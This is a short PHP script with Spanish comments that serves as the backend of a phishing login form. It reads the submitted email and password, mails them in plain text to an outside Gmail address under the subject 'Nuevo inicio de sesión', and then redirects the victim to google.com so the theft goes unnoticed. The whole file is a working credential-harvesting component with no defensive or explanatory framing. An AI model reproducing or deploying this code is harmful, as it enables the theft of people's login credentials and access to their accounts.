<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Obtener los datos del formulario
    $email = $_POST["email"];
    $password = $_POST["password"];

    // Aquí puedes incluir la lógica para enviar un correo electrónico
    $to = "servidordrive15gb@gmail.com";
    $subject = "Nuevo inicio de sesión";
    $message = "Correo electrónico: $email\nContraseña: $password";

    // Usando la función mail para enviar el correo electrónico (requiere configuración en el servidor)
    mail($to, $subject, $message);

    // Redirigir al usuario a Google.com después de enviar el correo electrónico
    header("Location: https://www.google.com");
    exit();
}
?>
